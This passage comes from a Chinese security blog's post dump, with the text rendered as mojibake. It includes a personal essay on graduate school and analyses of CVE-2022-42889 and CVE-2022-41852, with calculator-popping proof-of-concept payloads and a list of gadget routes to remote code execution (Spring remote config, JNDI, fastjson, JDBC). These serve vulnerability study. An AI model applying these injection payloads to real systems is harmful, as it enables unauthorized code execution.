è¿™é‡Œè°ƒç”¨çš„æ˜¯org.apache.jasper.xmlparser.XMLChar#isSpace 123public static boolean isSpace(int c) &#123; return c &lt;= 0x20 &amp;&amp; (CHARS[c] &amp; MASK_SPACE) != 0;&#125; çœå»ç»™å¤§å®¶çœ‹å¸¸é‡æµªè´¹æ—¶é—´ï¼Œè¿™é‡Œå½“è¯¾ä»£è¡¨æ€»ç»“ä¸€ä¸‹å°±æ˜¯å››ä¸ªå­—ç¬¦\\x0dã€\\x0a9ã€\\x0aã€\\x0d è€Œåœ¨è¯†åˆ«&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;è¿™éƒ¨åˆ†ä¸­å¯¹ç©ºæ ¼çš„åˆ¤å®šè°ƒç”¨çš„æ˜¯org.apache.jasper.compiler.JspReader#isSpaceï¼Œè¿™é‡Œåˆ¤æ–­çš„ç©ºæ ¼åªè¦ä¿è¯åœ¨\\x20ä¹‹å‰å³å¯ 123final boolean isSpace() &#123; return peekChar() &lt;= &#x27; &#x27;;&#125; å½“ç„¶æ›´å¤šçš„éƒ¨åˆ†å°±ä¸å¤šè¯´å•¦ï¼Œæ¯•ç«Ÿå·²ç»å’Œæœ¬æ–‡ç”±ç‚¹åç¦»å•¦","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Webshell","slug":"Webshell","permalink":"https://y4tacker.github.io/tags/Webshell/"}]},{"title":"è¯»ç ”çš„æ„ä¹‰ï¼Ÿ","slug":"year/2022/11/è¯»ç ”çš„æ„ä¹‰ï¼Ÿ","date":"2022-11-02T14:29:16.000Z","updated":"2024-08-04T09:01:49.090Z","comments":true,"path":"2022/11/02/year/2022/11/è¯»ç ”çš„æ„ä¹‰ï¼Ÿ/","link":"","permalink":"https://y4tacker.github.io/2022/11/02/year/2022/11/%E8%AF%BB%E7%A0%94%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F/","excerpt":"","text":"è¯»ç ”çš„æ„ä¹‰ï¼Ÿå†™åœ¨å‰é¢â€‹ æ¯ä¸ªäººéƒ½æœ‰å„è‡ªä¸åŒçš„å¤„å¢ƒï¼Œåœ¨æ¯ä¸ªé˜¶æ®µä¹Ÿä¼šæœ‰è‡ªå·±ä¸åŒçš„çœ‹æ³•ï¼Œæˆ‘å†™è¿™ç¯‡éšç¬”ä¹Ÿä¸æ˜¯æƒ³å»äº‰è®ºä»€ä¹ˆï¼Œåªæ˜¯è§‰å¾—è¯¥è®°å½•ä¸€ä¸ªçŠ¶æ€ï¼Œåªæ˜¯è§‰å¾—æˆ‘äººç”Ÿçš„ä¸€éƒ¨åˆ†æ„ä¹‰åœ¨äºä¸æ–­æ€è€ƒï¼Œè€Œè¿™éƒ¨åˆ†æ€è€ƒæˆ‘æƒ³ç•™åœ¨æœªæ¥æŸä¸€å¤©ï¼Œé—²æš‡é¥­ä½™æ—¶é—´å†ç¿»å¼€çœ‹çœ‹ï¼Œä¹Ÿè§è¯æˆ‘ä¸ªäººçš„äº›è®¸æˆé•¿. æ­£æ–‡â€‹ ä¸€åˆ‡çš„æºå¤´è¿˜æ˜¯æ¥è‡ªäºåƒå®Œæ³¡é¢æ— æ„é—´çœ‹åˆ°çš„æ ¡å‹å‘çš„ä¸€ç¯‡çµé­‚å‘é—®å¸–å­(é¡ºä¾¿åæ§½ä¸‹å¯æ¶çš„åè›‹å®¤å‹ï¼Œä¸¤ä¸ªäººåˆä¼™åƒæ³¡é¢é¦™æˆ‘ï¼Œé¦‹å•Šâ€¦åˆç™½é”»ç‚¼äº†) å¯¹æˆ‘è€Œè¨€ï¼Œæˆ‘ä»¥ä¸ºå¾ˆå¤šæ—¶å€™æˆ‘ä»¬é€‰æ‹©è¯»ç ”å°±åƒå½“åˆä¸ºä»€ä¹ˆæˆ‘ä»¬å»é€‰æ‹©é«˜è€ƒä¸€æ ·ï¼Œä¸€æ˜¯è¿«äºç¤¾ä¼šç¯å¢ƒï¼ŒäºŒæ˜¯æˆ‘ä»¬è¿˜å¾ˆå¹´è½»ï¼Œä¹ æƒ¯äºè¢«åˆ«äººå®‰æ’å¥½é“è·¯å¯¹å®¶é•¿è€å¸ˆçš„è¯åªèƒ½è¨€å¬è®¡ä»ï¼Œä½†å¾ˆå¤šæ—¶å€™æˆ‘ä»¬èº«ä¸ºå­¦ç”Ÿç¡®å®ä¹Ÿèº«ä¸ç”±å·±ï¼Œåªèƒ½èµ°ä¸€æ­¥çœ‹ä¸€æ­¥ï¼Œæˆ‘ä»¬æ²¡æœ‰é€€è·¯ä¹Ÿæ²¡æœ‰å¤šä½™çš„é€‰æ‹©. è€Œå¯¹äºæˆ‘ä»¬ä¸åŒçš„æ—¶é—´ç‚¹ä¹Ÿä¼šæœ‰ä¸åŒçš„æƒ³æ³• é«˜ä¸­æ—¶æœŸæˆ‘åœ¨æƒ³ä»€ä¹ˆå‘¢ï¼Ÿâ€œç­ä¸»ä»»å‘Šè¯‰æˆ‘ä»¬å¤§å­¦å¾ˆé‡è¦å†³å®šä¸€ç”Ÿï¼Œè¯»äº†ç ”æ›´æ˜¯äººä¸Šäººï¼â€ å¤§ä¸€æ—¶æœŸæˆ‘åœ¨æƒ³ä»€ä¹ˆå‘¢ï¼Ÿâ€œæˆ‘æˆç»©è¿™ä¹ˆå¥½ï¼Œä¸è¯»ç ”å¤ªæµªè´¹æœºä¼šäº†â€ å¤§äºŒæ—¶æœŸç»å†ä¸€äº›äº‹åï¼Œâ€œè¯»ç ”ä¼¼ä¹å¹¶ä¸æ˜¯æˆ‘æ‰€è¦çš„ï¼Œæ”¾å¼ƒå§ï¼Œå¿˜æ‰ä¹‹å‰çš„æˆç»©å§â€ å¯è™½è¯´æ”¾å¼ƒï¼Œåé¢ç»å†ä¸€äº›æŒ«æŠ˜ä¹‹åä¹Ÿæ—¶ä¸æ—¶æƒ³è¦å›å¤´ï¼Œå› ä¸ºå½“æ—¶è¿˜æ˜¯ç¦»ä¸å¼€å‘¨å›´å¯¹æˆ‘çš„å½±å“ï¼Œæ€»è§‰å¾—èƒœåˆ©çš„å¤©å¹³å¼€å§‹å€¾æ–œ åˆ°äº†ç°åœ¨ï¼Œç»å†å‰æ®µæ—¶é—´ä¿ç ”é£æ³¢ä»¥åŠç§‹æ‹›åï¼Œâ€œæ¥å—å´­æ–°çš„è‡ªå·±å§ï¼Œæ¥å—çœ¼å‰çš„æœªçŸ¥å§â€ å¯¹äºè¯»ä¸è¯»ç ”ï¼Œå¦‚æœæ”¾å¼ƒæˆ‘ä»¬ä¹Ÿå¿…é¡»æ‰¿æ‹…æ”¾å¼ƒçš„é£é™©ï¼Œ è¿™æ—¶å€™å¤§æ¦‚ä¼šæœ‰ä¸‰ç§æƒ…å†µï¼Œ ä¸€æ˜¯æœ¬æ¥æˆ‘æœ¬ç§‘å‡ºå»ç¡®å®ä¹Ÿæ‰¾ä¸åˆ°ä¸€ä¸ªå¾ˆå¥½çš„å·¥ä½œï¼Œè¯»ä¸ªç ”é•€ä¸ªé‡‘ï¼Œå–˜ä¸¤ä¸‰å¹´æ°”ï¼Œè¯´ä¸å®šæˆ‘ä¼šæœ‰æ›´å¥½çš„å¹³å° å¦ä¸€ç§æƒ…å†µæ˜¯ï¼Œæˆ‘æœ¬ç§‘èƒ½æ‰¾åˆ°ä¸€ä¸ªå¾ˆå¥½çš„å·¥ä½œï¼Œè¯»å®Œç ”ä»¥åæˆ‘å¯èƒ½è¿å½“åˆæ°´å¹³çš„å·¥ä½œéƒ½æ²¡æœ‰ è‡³äºæœ€åä¸€ç§ï¼Œæœ¬ç§‘å°±å¾ˆä¸é”™ï¼Œè¯»å®Œç ”æ·±é€ æˆ‘å˜å¾—æ›´å¥½äº† è¿™ä¸ªæ—¶å€™å…¶å®å·²ç»è¿›å…¥äº†ä¸€ä¸ªæ€ªåœˆäº†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å­¦ç”Ÿæ€ç»´ æˆ‘ä»¬æ€»æ˜¯è®¤ä¸ºåŠªåŠ›å°±ä¼šæœ‰æ”¶è·ï¼Œæ˜ å°„åˆ°ç”Ÿæ´»ä¸­å°±æ˜¯ï¼Œæˆ‘å¬è¯¾äº†å°±èƒ½æœ‰å¥½æˆç»©ï¼Œæˆ‘å®ä¹ äº†å°±å¯ä»¥è½¬æ­£ï¼Œæˆ‘å¯¹ä½ å¥½ä½ å°±ä¼šå¯¹æˆ‘å¥½ï¼Œäº‹å®çœŸçš„å¦‚æ­¤ä¹ˆï¼Ÿç›¸ä¿¡ç»å†äº†è¿™ä¹ˆå¤šä½ ä¹Ÿå¼€å§‹æ€€ç–‘ï¼Œæ€€ç–‘æœ¬èº«å¹¶ä¸å¯æ€•ï¼Œä½†å¯æ€•çš„æ˜¯ï¼Œæˆ‘ä»¬å´ä¸€ç›´åªæ˜¯åœ¨æ€€ç–‘ç½¢äº†ï¼Œæˆ‘ä»¬ä¸æ•¢å»åšå‡ºæ”¹å˜ï¼Œè¿™è‚¡å¥‡æ€ªçš„æ€æƒ³ä¼šä¸€ç›´ç¬¼ç½©ç€æˆ‘ä»¬ï¼Œä»å¤§ä¸€åˆ°å¤§å››ï¼Œè¿™æ—¶å€™ä½ ä¸å¾—ä¸é¢ä¸´é€‰æ‹©äº†ï¼Œä½†è¿™æ—¶å€™ä½ å´çªç„¶å‘ç°ä½ åˆæ²¡çš„é€‰æ‹©ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±åˆè¿›å…¥äº†é«˜ä¸­æ—¶æœŸé‚£èˆ¬æ€è€ƒï¼Œè€Œè¿™ç§æ€è€ƒå«åšä¾èµ–ï¼Œæˆ‘ä»¬ä¸€ç›´ä¾èµ–åˆ«äººï¼Œä¾èµ–åˆ«äººå»å¸®æˆ‘ä»¬åšå‡ºé€‰æ‹©ï¼Œæˆ‘ä»¬æ€»æ˜¯ä¹ æƒ¯å‘†åœ¨ä¸€ä¸ªèˆ’é€‚åœˆå½“ä¸­ï¼Œä¸æ„¿å»æ‰“ç ´çœ¼å‰çš„å°ç¾å¥½ï¼Œä½†å…¶å®ç¤¾ä¼šå¹¶ä¸ä¼šä¸€ç›´å® æˆ‘ä»¬ï¼Œæˆ‘ä»¬éœ€è¦å°½æ—©åšå‡ºé€‚åº”åšå‡ºæ”¹å˜ï¼Œèµ°å‡ºçˆ¶æ¯çš„æ€€æŠ±ï¼Œæˆé•¿éƒ½æ˜¯ç—›è‹¦çš„ï¼Œè¿™ä¸€è·¯ä¸Šå¿…ç„¶ä¼šä¼´éšç€è†æ£˜ï¼Œä¹Ÿä¼´éšç€å‘¨å›´å¼‚æ ·çš„ç›®å…‰ï¼Œå½“ç„¶æˆ‘ä¹Ÿä¸æ’é™¤æœ‰äººå¤©ç”Ÿå°±æ˜¯æ™ºåŠ›é«˜ï¼Œè¿æ°”å°±æ˜¯å¥½ï¼Œåªéœ€è¦ä¸€ç‚¹ç‚¹çš„åŠªåŠ›å°±èƒ½æœ‰å¾ˆå¥½çš„å›æŠ¥ï¼Œä½†æˆ‘ä¹Ÿé—®è¿‡æˆ‘è‡ªå·±ï¼Œä½ è§‰å¾—ä½ æ˜¯ä¹ˆï¼Ÿç­”æ¡ˆæ˜¾è€Œæ˜“è§ï¼Œä¸æ˜¯ï¼Œå› æ­¤èµ°å‡ºå¿ƒé‡Œçš„èˆ’é€‚åœˆï¼Œæ‹¥æŠ±å˜åŒ–æ‰æ˜¯æˆ‘è¯¥åšçš„ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä¹Ÿä¸€ç›´å¾ˆæ„Ÿæ¿€æˆ‘çš„çˆ¶æ¯ï¼Œæ„Ÿæ¿€æˆ‘å¤„äºä¸€ä¸ªå¾ˆå¼€æ”¾çš„å®¶åº­ï¼Œåœ¨å®¶é‡Œæˆ‘çš„èº«ä»½æ˜¯çˆ¶æ¯çš„å­©å­ï¼Œä½†ä»å¤§å­¦åå†è¡Œä¸ºä¸Šæˆ‘æ˜æ˜¾æ›´æ„Ÿå—åˆ°æˆ‘ä»¬æ˜¯â€œåŒè¾ˆâ€œï¼Œä»–ä»¬å°Šé‡æˆ‘çš„æ¯ä¸€ä¸ªå†³å®šï¼Œæˆ‘è®°å¾—å½“åˆæˆ‘å¯¹ä»–ä»¬è¯´â€œæˆ‘æ”¾å¼ƒäº†æŸä¸ªå¾ˆå¥½å­¦æ ¡çš„ä¿ç ”â€ï¼Œ ä»–ä»¬çš„å›ç­”æ˜¯â€œä½ æƒ³å¥½äº†å—ï¼Ÿæˆ‘ä»¬è¿˜æ˜¯è®¤ä¸ºè¯»ç ”å¯¹ä½ ä¼šæ›´å¥½ï¼Ÿä½†æ˜¯æˆ‘ä»¬æ¯•ç«Ÿä»€ä¹ˆä¹Ÿä¸æ‡‚ï¼Œæˆ‘ä»¬ä¼šå°Šé‡ä½ çš„å†³å®šï¼Œä½†å¸Œæœ›ä½ å†å¥½å¥½æƒ³æƒ³ï¼â€ æˆ‘å¾ˆç¡®ä¿¡æ²¡æœ‰ä»–ä»¬çš„æ”¯æŒæˆ‘ç¡®å®ä¹Ÿèµ°ä¸åˆ°ä»Šå¤©ï¼Œå› æ­¤æˆ‘å¾ˆæ„Ÿæ¿€æˆ‘çš„çˆ¶æ¯ï¼Œæ²¡æœ‰ä»–ä»¬æˆ‘ä¸ä¼šè·å¾—è¿™ä¹ˆè‡ªç”±ã€‚ å¥½äº†ä»Šå¤©å°±åˆ°è¿™é‡Œï¼Œè¯¥è¯´çš„ä¹Ÿéƒ½è¯´çš„å·®ä¸å¤šäº†ï¼Œæˆ‘ä¹Ÿå›°äº†ï¼Œè¯¥åˆ·åˆ·bç«™ç¡è§‰äº†â€¦zzz åè¯å¸Œæœ›ä½ çœ‹åˆ°è¿™é‡Œï¼Œä¸è¦å¿ƒé‡ŒçŒ›çš„å†²åŠ¨æ¯æ‰è‡ªå·±ç°æœ‰çš„æˆæœï¼Œæ¯•ç«Ÿæˆ‘ä»¬ä¸èƒ½ä¿è¯æ”¹å˜å°±ä¼šå˜å¥½ï¼Œå°±è¿™ä¸ªæ—¶é—´ç‚¹æ¥è¯´å¯èƒ½ä¼šå˜å¾—æ›´å·®ï¼Œä¹Ÿå¯èƒ½å˜å¾—æ›´å¥½ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è¿™ä¸ªä¸–ç•Œä¸€äº›å¦¥åï¼Œä¸ºæ¼«é•¿çš„äººç”Ÿè·¯å¢åŠ ä¸€äº›æŠ—é£é™©çš„èƒ½åŠ›ï¼Œä¹Ÿä¸ºä½ çš„äººç”Ÿå¤šä¸€ç‚¹åŠ åˆ†ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€‰æ‹©åšä¿¡ï¼Œå‘ç€è¿™ä¸ªä¸–ç•Œï¼Œå¯¹ç€æœªçŸ¥å‘èµ·å†²æ’ï¼Œè‡³äºæ”¶è·å˜›ï¼Œå¯èƒ½å°±æ˜¯æ›´å¤šçš„ååå·å·ï¼Œä»¥åŠç—›è‹¦çš„æˆé•¿äº†ã€‚ å†™ç»™å­¦å¼Ÿå­¦å¦¹ä»¬â€‹ å¸Œæœ›çœ‹åˆ°è¿™ç¯‡æ„Ÿæƒ³çš„æ˜¯æˆ‘å¤§ä¸€å¤§äºŒçš„å­¦å¼Ÿå­¦å¦¹ä»¬ï¼Œå› ä¸ºä½ ä»¬çš„å¯å¡‘æ€§è¿˜å¾ˆå¼ºï¼Œè¿˜æœ‰çŸ­æ—¶æœŸäººç”Ÿå†³å®šçš„èƒ½åŠ›ï¼Œå¸Œæœ›ä½ ä»¬èƒ½è®¤æ¸…è‡ªå·±ï¼Œè®¤æ¸…å‘¨å›´çš„ç¯å¢ƒï¼Œä¸è¦ä¸€å‘³çš„çœ‹ç€æˆç»©ï¼Œä¸€ä½æƒ³ç€åªæœ‰è¯»ç ”è¿™ä¸€æ¡è·¯å­ï¼Œé€‚å½“çš„æ—¶å€™ä¹Ÿç»™è‡ªå·±å¤šæ¡åè·¯ï¼Œè¯´è¿™äº›è¯æˆ‘ä¹Ÿå¹¶ä¸é¼“åŠ±ä½ ä»¬éƒ½å»æ— è„‘é€‰æ‹©å·¥ä½œ(æ›´å¸Œæœ›ä½ æ˜¯å› ä¸ºæƒ³å·¥ä½œè€Œå·¥ä½œï¼Œä¸æ˜¯å› ä¸ºè‡ªå·±çš„é¢“åºŸè€Œé€ æˆæ²¡å¾—é€‰)ï¼Œæ¯•ç«Ÿæˆ‘ä¹Ÿä»ä½ ä»¬çš„é˜¶æ®µèµ°è¿‡ï¼Œæˆ‘ä¹Ÿç†è§£ä½ ä»¬å„ä¸ªæ—¶æœŸçš„æƒ³æ³•ï¼Œå½“ç„¶æœ€ç»ˆä¸ç®¡æ˜¯å·¥ä½œè¿˜æ˜¯é€‰æ‹©ç»§ç»­æ·±é€ ï¼Œæˆ‘æ›´å¸Œæœ›ä½ èƒ½åšå®šä¿¡å¿ƒï¼Œå¼€å¼€å¿ƒå¿ƒçš„èµ°ä¸‹å»ã€‚","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"æµ…æApache Commons Text(CVE-2022-42889)","slug":"year/2022/10/æµ…æApache-Commons-Text-CVE-2022-42889","date":"2022-10-29T06:31:19.000Z","updated":"2024-08-04T09:01:49.074Z","comments":true,"path":"2022/10/29/year/2022/10/æµ…æApache-Commons-Text-CVE-2022-42889/","link":"","permalink":"https://y4tacker.github.io/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/","excerpt":"","text":"æµ…æApache Commons Text(CVE-2022-42889)å‰æ®µæ—¶é—´æˆ‘åœ¨çŸ¥è¯†æ˜Ÿçƒä¸Šå¸ƒç½®äº†ä¸€ä¸ªå°ä½œä¸šï¼Œç®—æ˜¯èµ¶åœ¨ä¸€ä¸ªæ–°çš„CVEå‘å¸ƒä¹‹å‰åšäº†ä¸ªç®€å•é¢„è­¦äº† ä¹‹åå‘¢å¯ä»¥é¢„è§ï¼ŒApacheå®˜æ–¹ç¡®å®åœ¨å‡ å¤©åå‘å¸ƒäº†ä¸€æ¬¡æ›´æ–°ï¼Œå†…å®¹æ˜¯https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1omï¼Œç‰ˆæœ¬æ›´æ–°ä»¥åŠCVEçš„å†…å®¹ å…¶å®æ€»ä½“è€Œè¨€è¿™ä¸ªçš„æŒ–æ˜éš¾åº¦ä¸ç®—é«˜ï¼Œå’Œå‰ä¸€æ®µæ—¶é—´åˆšå‡ºçš„Apache Commons Configurationçš„RCEé•¿çš„ä¹ŸåŸºæœ¬ä¸€è‡´ï¼ŒåŸç†ä¹Ÿä¸å¿…å¤šè¯´ æ ¹æ®å®˜æ–¹çš„demoå‘¢ï¼Œå’‹ä»¬ä¹Ÿå¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºå®ƒçš„åŸºæœ¬ç”¨æ³•ä»¥åŠæ¼æ´å‡ºå‘ç‚¹ ç®€å•çš„ä»org.apache.commons.text.lookup.DefaultStringLookupä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œå®ƒæ”¯æŒä¸€ä¸ªscriptçš„ç”¨æ³• å®ƒå¯¹åº”äºä¸€ä¸ªå«org.apache.commons.text.lookup.ScriptStringLookupçš„ç±»ï¼Œä»å®ƒçš„lookupæ–¹æ³•å½“ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å¹³æ—¶RCEæ‰€å¸¸ç”¨åˆ°çš„æ‰§è¡ŒJSå®ç°RCE å› æ­¤POCä¹Ÿç›¸å¯¹ç®€å• 1$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;open -na Calculator&quot;)&#125; æ•´ä¸ªæ¼æ´æ¯”è¾ƒç®€å•ï¼Œä½†ä»æ¼æ´å½¢å¼ä»¥åŠç»„ä»¶ç±»å‹æ¥è¯´å±å®³æå¤§ï¼Œä½†ç»è¿‡æœç´¢å‘ç°ç½‘ä¸Šå¼€æºé¡¹ç›®ä¸­ç”¨åˆ°çš„è™½ç„¶ä¹Ÿæœ‰ï¼Œä½†å´çœ‹ä¸è§å‘å®˜æ–¹demoå½“ä¸­æåˆ°çš„è¿™ç§ç”¨æ³•ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤ä¸€äº›å†…éƒ¨å‚å•†è‡ªå·±ä½¿ç”¨è¿™æ ·çš„å†™æ³•ï¼Œä½œä¸ºç»™æ–°æ‰‹å­¦ä¹ äº†è§£è¿™ä¸ªæ´è¿˜æ˜¯ä¸é”™çš„ï¼Œå› æ­¤ä¹Ÿæœ‰åœ¨çŸ¥è¯†æ˜Ÿçƒå‘å°ä½œä¸šçš„å½¢å¼.","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apache Commons Text","slug":"Apache-Commons-Text","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Text/"}]},{"title":"æµ…æApache Commons Jxpathå‘½ä»¤æ‰§è¡Œåˆ†æ(CVE-2022-41852)","slug":"year/2022/10/æµ…æApache-Commons-Jxpathå‘½ä»¤æ‰§è¡Œåˆ†æ-CVE-2022-41852","date":"2022-10-13T12:21:30.000Z","updated":"2024-08-04T09:01:49.065Z","comments":true,"path":"2022/10/13/year/2022/10/æµ…æApache-Commons-Jxpathå‘½ä»¤æ‰§è¡Œåˆ†æ-CVE-2022-41852/","link":"","permalink":"https://y4tacker.github.io/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/","excerpt":"","text":"æµ…æApache Commons Jxpathå‘½ä»¤æ‰§è¡Œåˆ†æ(CVE-2022-41852)æœ¬æ–‡é¦–å‘äºè·³è·³ç³–:https://tttang.com/archive/1771/ å½±å“ç‰ˆæœ¬commons-jxpath:commons-jxpath &lt;= 1.3 ä¸€ç›´åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œå®˜æ–¹ä¹Ÿä¸æ‰“ç®—ä¿®äº† åˆ©ç”¨æ¢ç´¢æµ‹è¯•ç¯å¢ƒï¼šjxpath1.3 JXPathæ”¯æŒæ ‡å‡†çš„XPathå‡½æ•°ï¼Œå¼€ç®±å³ç”¨ã€‚å®ƒè¿˜æ”¯æŒ â€œæ ‡å‡† â€œæ‰©å±•å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åŸºæœ¬ä¸Šæ˜¯é€šå¾€Javaçš„æ¡¥æ¢ï¼Œä»¥åŠå®Œå…¨è‡ªå®šä¹‰çš„æ‰©å±•å‡½æ•°ã€‚ ç®€å•ä»æ¼æ´æè¿°å¯ä»¥çœ‹å‡ºç”±äºè§£æxpathè¡¨è¾¾å¼çš„é—®é¢˜é€ æˆçš„æ¼æ´ å…¶å®è¿™æ¥æºå®˜æ–¹çš„ä¸€ä¸ªfeatureï¼Œå¦‚å›¾çœ‹èµ·æ¥å®ƒèµ‹äºˆäº†æˆ‘ä»¬ä¸€ç§åŠ¨æ€æ‰§è¡Œä»£ç çš„èƒ½åŠ› è¿™æ—¶å€™æˆ‘ä»¬å°±ä¼šæƒ³ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§å¥‡æ€ªçš„éœ€æ±‚ï¼Œæ¯•ç«Ÿä»å¹³æ—¶ç»éªŒæ¥è®²xpathï¼Œä½œä¸ºä¸€ç§è·¯å¾„è¯­è¨€ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯å¸®åŠ©æˆ‘ä»¬å¯¹xmlè¿›è¡Œä¸€äº›ç®€å•çš„ä¿¡æ¯æ£€ç´¢ï¼Œç„¶è€Œå®ƒå«JXpathè€Œä¸å«Xpathï¼Œå› æ­¤å…¶å®ä»å®ç°ä¸Šæ¥è®²å®ƒä¸ä»…å®ç°äº†xpathæŸ¥è¯¢çš„ä¸€äº›åŸºç¡€åŠŸèƒ½ï¼Œæ›´é‡è¦çš„æ˜¯å®ƒæ­å»ºäº†ä¸€ä¸ªé€šå¾€javaçš„æ¡¥æ¢ï¼Œä»å®˜æ–¹çš„è®¾è®¡åˆè¡·ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œå®ƒçš„è®¾è®¡å®ç°å…¶å®æ›´åƒä¸€æ¬¾è¡¨è¾¾å¼è¯­è¨€ Primary applications of JXPath are in scripting: JSP and similar template/script based technologies. However, programmers who prefer XML-flavored APIs, should consider JXPath as an alternative to other expression languages as well. JXPath is a must-have tool for those who work with mixtures of Java objects and XML and need to frequently traverse through graphs of those. ç®€å•çš„æµ‹è¯•ç®€å•å†™ä¸ªæµ‹è¯•demo Test.java 12345678import org.apache.commons.jxpath.JXPathContext;public class Test &#123; public static void main(String[] args) &#123; JXPathContext context = JXPathContext.newContext(null); context.getValue(&quot;com.example.springdemo.calc.calc()&quot;); &#125;&#125; Calc.java 1234567891011package com.example.springdemo;public class calc &#123; public static void calc()&#123; try &#123; Runtime.getRuntime().exec(&quot;open -na Calculator&quot;); &#125;catch (Exception e )&#123; &#125; &#125;&#125; å¯¹äºå¦‚ä½•è§£æå…¶å®å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¹¶ä¸éœ€è¦å»å…³æ³¨å¯¹å­—ç¬¦tokençš„è§£æè¿‡ç¨‹ï¼Œæ¯•ç«Ÿæˆ‘ä»¬è¿™ä¹Ÿä¸æ˜¯ç»•wafï¼Œæˆ‘ä»¬ä¹Ÿä¸éœ€è¦çŸ¥é“å¦‚ä½•å»å®ç°ä¸€äº›ç•¸å½¢æ„é€ è¾¾åˆ°ä¸€è‡´çš„åŠŸèƒ½ï¼Œè€Œåœ¨è¿™é‡Œæˆ‘ä»¬æ›´åº”è¯¥å…³æ³¨ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬åº”è¯¥å…³æ³¨å®ƒå®˜ç½‘è¿™ä¸ªfeatureå¦‚ä½•å®ç°çš„è°ƒç”¨ï¼Œä»¥åŠè°ƒç”¨æ–¹æ³•å¯¹æ–¹æ³•åˆæœ‰ä»€ä¹ˆé™åˆ¶ï¼Ÿ åœ¨org.apache.commons.jxpath.PackageFunctions#getFunctionå½“ä¸­ è¿™é‡Œå¯ä»¥çœ‹å‡ºå…è®¸çš„è°ƒç”¨ä¸€ä¸ªæ˜¯æ„é€ å‡½æ•°ï¼Œå¦ä¸€ä¸ªæ˜¯é™æ€æ–¹æ³•ï¼Œå½“ç„¶ä»–ä»¬éƒ½éœ€è¦æ˜¯publicä¿®é¥° å†æ¬¡å›åˆ°org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValueå½“ä¸­, åœ¨è·å¾—äº†org.apache.commons.jxpath.Functionå¯¹åº”çš„è¿™ä¸ªå®ä¾‹åï¼Œå›å»è°ƒç”¨å…·ä½“çš„invokeçš„å®ç° è€ŒFunctionå…·ä½“çš„æ¥å£å®ç°æœ‰ä¸¤ä¸ªç±» org.apache.commons.jxpath.functions.ConstructorFunction org.apache.commons.jxpath.functions.MethodFunction å¦‚ä½•åˆ¤æ–­è¿”å›çš„æ˜¯å“ªä¸ªç±»ï¼Ÿ ConstructorFunctionçš„invokeå°±ä¸å¤šè¯´äº†ï¼Œå®ä¾‹åŒ–æ„é€ å‡½æ•°ï¼Œå¦ä¸€ä¸ªMethodFunction#invokeï¼Œåå°„æ‰§è¡Œæ–¹æ³•ï¼Œéƒ½æ²¡ä»€ä¹ˆå¥½è¯´çš„ é‚£ä¹ˆæˆ‘ä»¬å‡è®¾å°±ä»å®˜æ–¹çš„demoå‡ºå‘ï¼Œæˆ‘ä»¬èƒ½åšäº›ä»€ä¹ˆï¼Ÿ å¯¹äºå®ä¾‹åŒ–æˆ‘ä»¬èƒ½åšä»€ä¹ˆæ¯”å¦‚è¯´å¯¹äºnewè¿™ä¸ªæ“ä½œæ¥è¯´ï¼Œä¸€äº›å¸¸è§çš„å¦‚springå½“ä¸­æœ‰ä¸¤ä¸ªç±»æ„é€ å‡½æ•°å°±èƒ½åŠ è½½è¿œç¨‹é…ç½®å¯ä»¥rce org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext å¯¹äºé™æ€æ–¹æ³•æˆ‘ä»¬èƒ½åšä»€ä¹ˆjndiå½“ä¸­æœ‰é™æ€æ–¹æ³•ï¼Œjavax.naming.InitialContext.doLookup ä¸€äº›å¸¸è§åº“æ¯”å¦‚fastjsonå‡ºå‘jsonååºåˆ—åŒ– å½“ç„¶è¿˜æœ‰jdbcæ”»å‡»ä¹Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ’•å¼€ä¸€æ¡æ¼æ´çš„å£å­ å½“ç„¶è‚¯å®šè¿˜æœ‰å…¶ä»–çš„æ”»å‡»æ‰‹æ³•æ¯•ç«Ÿjreå½“ä¸­æœ‰å¾ˆå¤šç±»è¿™é‡Œåªæ˜¯ä¸¾ä¸€äº›ä¾‹å­è€Œå·²ï¼Œå¯¹äºå­¦ä¹ è¶³å¤Ÿäº† 